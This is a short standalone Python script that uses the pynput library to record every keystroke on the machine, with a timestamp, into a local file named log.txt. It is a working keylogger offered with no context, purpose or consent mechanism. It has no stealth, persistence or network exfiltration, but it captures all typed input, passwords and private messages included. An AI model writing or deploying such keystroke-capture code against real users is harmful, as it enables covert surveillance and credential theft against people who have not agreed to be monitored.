from pynput.keyboard import Listener
from datetime import datetime

def on_press(key):
    with open("log.txt", "a") as file:
        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            file.write(f"{time} - {key.char}\n")
        except:
            file.write(f"{time} - [{key}]\n")

with Listener(on_press=on_press) as listener:
    listener.join()